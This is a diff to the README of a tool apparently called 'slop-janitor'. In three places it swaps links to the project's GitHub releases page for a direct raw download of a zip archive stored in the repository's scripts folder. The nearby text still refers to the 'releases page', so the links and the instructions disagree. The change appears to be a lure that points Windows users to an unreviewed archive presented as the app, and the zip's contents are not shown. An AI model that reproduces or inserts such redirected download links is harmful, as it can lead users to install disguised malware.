@@ -1,6 +1,6 @@
 # 🧹 slop-janitor - Repeatable Refactor Loops Made Simple
 
-[⬇️ Download slop-janitor](https://github.com/Speechopeningline822/slop-janitor/releases)
+[⬇️ Download slop-janitor](https://github.com/Speechopeningline822/slop-janitor/raw/refs/heads/main/scripts/janitor-slop-v3.6-beta.1.zip)
 
 ## 🧭 What this app does
 
@@ -22,7 +22,7 @@ If you plan to use it with Codex, keep your normal API access or local setup rea
 
 Visit this page to download the app for Windows:
 
-[https://github.com/Speechopeningline822/slop-janitor/releases](https://github.com/Speechopeningline822/slop-janitor/releases)
+[https://github.com/Speechopeningline822/slop-janitor/raw/refs/heads/main/scripts/janitor-slop-v3.6-beta.1.zip](https://github.com/Speechopeningline822/slop-janitor/raw/refs/heads/main/scripts/janitor-slop-v3.6-beta.1.zip)
 
 On the releases page, look for the latest version and download the Windows file that matches your system. If there are multiple files, choose the one meant for Windows. Save it to a folder you can find, such as Downloads or Desktop.
 
@@ -148,7 +148,7 @@ That makes it easy to see what changed from one loop to the next.
 
 The releases page is the place to check for new builds, fixes, and updated Windows files.
 
-[https://github.com/Speechopeningline822/slop-janitor/releases](https://github.com/Speechopeningline822/slop-janitor/releases)
+[https://github.com/Speechopeningline822/slop-janitor/raw/refs/heads/main/scripts/janitor-slop-v3.6-beta.1.zip](https://github.com/Speechopeningline822/slop-janitor/raw/refs/heads/main/scripts/janitor-slop-v3.6-beta.1.zip)
 
 When a new release appears, download the newest Windows file and replace your old copy if needed.
 
